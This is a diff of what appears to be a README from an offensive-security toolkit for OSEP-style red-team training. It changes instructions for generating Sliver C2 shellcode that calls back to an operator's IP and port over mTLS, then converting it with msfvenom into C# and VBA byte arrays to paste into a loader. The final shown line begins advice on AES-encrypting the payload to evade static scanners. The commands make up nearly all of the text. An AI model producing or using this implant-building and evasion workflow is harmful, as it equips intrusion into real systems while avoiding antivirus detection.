@@ -18,16 +18,15 @@ byte array:
 
 ```bash
 sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
-python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp   # paste byte[] into `buf`
+msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs   # paste byte[] into `buf`
 ```
 
-Or generate raw shellcode and convert (incl. VBA `Array(...)`) — run from the
-`osep-tools` repo root:
+Or generate raw shellcode and convert to C# / VBA arrays:
 
 ```bash
 sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
-python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp
-python3 sliver/sliver2arrays.py /tmp/sc.bin --vba
+msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs
+msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f vba -o /tmp/sc.vba
 ```
 
 To keep the payload off disk/static scanners, pipe the C# array through the AES
